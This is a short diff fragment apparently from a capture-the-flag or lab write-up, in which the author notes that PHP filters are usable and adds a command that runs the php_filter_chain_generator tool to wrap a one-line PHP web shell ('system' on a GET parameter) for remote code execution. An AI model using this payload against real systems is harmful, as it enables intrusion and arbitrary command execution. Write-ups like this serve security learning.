@@ -328,5 +328,9 @@ However it does look like i can use PHP filters
 
 https://github.com/synacktiv/php_filter_chain_generator
 
+```python
+❯❯❯ python3 php_filter_chain_generator.py --chain '<?=system($_GET[0]);?>'
+```
+
 
 
